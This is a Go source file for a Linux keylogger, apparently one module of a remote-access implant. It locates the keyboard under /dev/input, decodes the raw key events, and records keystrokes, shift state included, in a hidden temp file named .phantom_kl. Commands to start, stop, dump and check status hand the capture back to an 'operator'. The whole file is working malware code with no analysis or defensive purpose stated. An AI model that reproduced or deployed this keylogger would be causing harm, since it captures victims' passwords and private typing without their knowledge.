//go:build linux

package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"unsafe"
)

// The capture is archived to a file so dumps survive both buffer trims and
// implant restarts; the reader stops as soon as the operator disarms it.
var (
	klMu    sync.Mutex
	klOn    bool
	klShift bool
	klDev   string
	klFile  = filepath.Join(os.TempDir(), ".phantom_kl")
)

const (
	klMax  = 512 * 1024
	klTail = 256 * 1024
)

type inputEvent struct {
	Time  syscall.Timeval
	Type  uint16
	Code  uint16
	Value int32
}

var keymap = map[uint16][2]string{
	2: {"1", "!"}, 3: {"2", "@"}, 4: {"3", "#"}, 5: {"4", "$"}, 6: {"5", "%"},
	7: {"6", "^"}, 8: {"7", "&"}, 9: {"8", "*"}, 10: {"9", "("}, 11: {"0", ")"},
	12: {"-", "_"}, 13: {"=", "+"},
	16: {"q", "Q"}, 17: {"w", "W"}, 18: {"e", "E"}, 19: {"r", "R"}, 20: {"t", "T"},
	21: {"y", "Y"}, 22: {"u", "U"}, 23: {"i", "I"}, 24: {"o", "O"}, 25: {"p", "P"},
	26: {"[", "{"}, 27: {"]", "}"},
	30: {"a", "A"}, 31: {"s", "S"}, 32: {"d", "D"}, 33: {"f", "F"}, 34: {"g", "G"},
	35: {"h", "H"}, 36: {"j", "J"}, 37: {"k", "K"}, 38: {"l", "L"},
	39: {";", ":"}, 40: {"'", `"`}, 41: {"`", "~"}, 43: {"\\", "|"},
	44: {"z", "Z"}, 45: {"x", "X"}, 46: {"c", "C"}, 47: {"v", "V"}, 48: {"b", "B"},
	49: {"n", "N"}, 50: {"m", "M"},
	51: {",", "<"}, 52: {".", ">"}, 53: {"/", "?"},
	57: {" ", " "},
}

func keylogStart(dev string) Result {
	klMu.Lock()
	if klOn {
		klMu.Unlock()
		return Result{OK: true, Out: "already running"}
	}
	path := dev
	if path == "" {
		path = findKeyboard()
	}
	if path == "" {
		klMu.Unlock()
		return Result{OK: false, Err: "no keyboard device found (needs root and /dev/input access)"}
	}
	f, err := os.Open(path)
	if err != nil {
		klMu.Unlock()
		return Result{OK: false, Err: "open " + path + ": " + err.Error()}
	}
	f.Close()
	klOn = true
	klShift = false
	klDev = path
	klMu.Unlock()
	go klRead(path)
	return Result{OK: true, Out: "keylogging " + path}
}

func keylogStop() Result {
	klMu.Lock()
	klOn = false
	dev := klDev
	klMu.Unlock()
	out := klTake()
	if out == "" {
		return Result{OK: true, Out: "stopped (" + dev + ")"}
	}
	return Result{OK: true, Out: out}
}

func keylogDump(clear bool) Result {
	out := klTake()
	if clear {
		klMu.Lock()
		os.Truncate(klFile, 0)
		klMu.Unlock()
	}
	if out == "" {
		return Result{OK: true, Out: "(empty)"}
	}
	return Result{OK: true, Out: out}
}

func keylogStatus() Result {
	klMu.Lock()
	on, dev := klOn, klDev
	klMu.Unlock()
	size := int64(0)
	if info, err := os.Stat(klFile); err == nil {
		size = info.Size()
	}
	state := "stopped"
	if on {
		state = "running"
	}
	if dev == "" {
		dev = "auto"
	}
	return Result{OK: true, Out: fmt.Sprintf("%s · device=%s buffer=%dB", state, dev, size)}
}

func klTake() string {
	klMu.Lock()
	defer klMu.Unlock()
	b, err := os.ReadFile(klFile)
	if err != nil {
		return ""
	}
	os.Truncate(klFile, 0)
	return string(b)
}

func findKeyboard() string {
	if m, _ := filepath.Glob("/dev/input/by-path/*kbd*"); len(m) > 0 {
		return m[0]
	}
	for i := 0; i < 16; i++ {
		p := fmt.Sprintf("/dev/input/event%d", i)
		if hasKeyBit(p) {
			return p
		}
	}
	return ""
}

// EVIOCGBIT(0, 8) = 0x80084520 — check the EV_KEY capability bit
func hasKeyBit(path string) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()
	buf := make([]byte, 8)
	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(),
		0x80084520, uintptr(unsafe.Pointer(&buf[0])))
	if errno != 0 {
		return false
	}
	return buf[1]&0x02 != 0
}

// klRead decodes the evdev stream until the operator disarms the capture.
func klRead(path string) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()
	size := int(unsafe.Sizeof(inputEvent{}))
	buf := make([]byte, size)
	for {
		klMu.Lock()
		on := klOn
		klMu.Unlock()
		if !on {
			return
		}
		if _, err := io.ReadFull(f, buf); err != nil {
			return
		}
		ev := *(*inputEvent)(unsafe.Pointer(&buf[0]))
		if ev.Type != 1 { // EV_KEY
			continue
		}
		switch ev.Code {
		case 42, 54: // shift
			klMu.Lock()
			klShift = ev.Value != 0
			klMu.Unlock()
		case 28: // enter
			if ev.Value == 1 {
				klAppend("\n")
			}
		case 14: // backspace
			if ev.Value == 1 {
				klAppend("\b")
			}
		case 15: // tab
			if ev.Value == 1 {
				klAppend("\t")
			}
		default:
			if ev.Value != 1 {
				continue
			}
			if m, ok := keymap[ev.Code]; ok {
				klMu.Lock()
				shift := klShift
				klMu.Unlock()
				if shift {
					klAppend(m[1])
				} else {
					klAppend(m[0])
				}
			}
		}
	}
}

func klAppend(s string) {
	klMu.Lock()
	defer klMu.Unlock()
	f, err := os.OpenFile(klFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(s)
	if info, err := f.Stat(); err == nil && info.Size() > klMax {
		if b, err := os.ReadFile(klFile); err == nil && len(b) > klTail {
			os.WriteFile(klFile, b[len(b)-klTail:], 0600)
		}
	}
}
